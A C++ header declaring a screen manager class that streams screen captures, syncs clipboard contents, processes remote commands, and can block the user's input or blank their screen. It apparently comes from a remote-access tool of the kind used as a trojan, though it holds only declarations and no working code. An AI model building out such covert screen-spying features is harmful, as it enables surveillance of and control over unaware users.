// ScreenManager.h: interface for the CScreenManager class.
//
//////////////////////////////////////////////////////////////////////

#pragma once

#include "ScreenSpy.h"
#include "CursorInfo.h"

class CScreenManager
{
public:
	CScreenManager();
	virtual ~CScreenManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	void sendBITMAPINFO();
	void sendFirstScreen();
	void sendNextScreen();
	bool IsMetricsChange();
	bool IsConnect();
	int	GetCurrentPixelBits();

private:
    void UpdateLocalClipboard(char *buf, int len);
    void SendLocalClipboard();
    void ResetScreen(int biBitCount);
    void ProcessCommand(LPBYTE lpBuffer, UINT nSize);
    static DWORD WINAPI WorkThread(LPVOID lparam);
    static DWORD WINAPI	ControlThread(LPVOID lparam);

public:
	bool        m_bIsWorking;
	bool        m_bIsBlockInput;
	bool        m_bIsBlankScreen;

private:
	BYTE	    m_bAlgorithm;
	bool	    m_bIsCaptureLayer;
	int	        m_biBitCount;
    HANDLE	    m_hWorkThread;
    HANDLE      m_hBlankThread;
	CCursorInfo	m_CursorInfo;
	CScreenSpy	*m_pScreenSpy;	
};
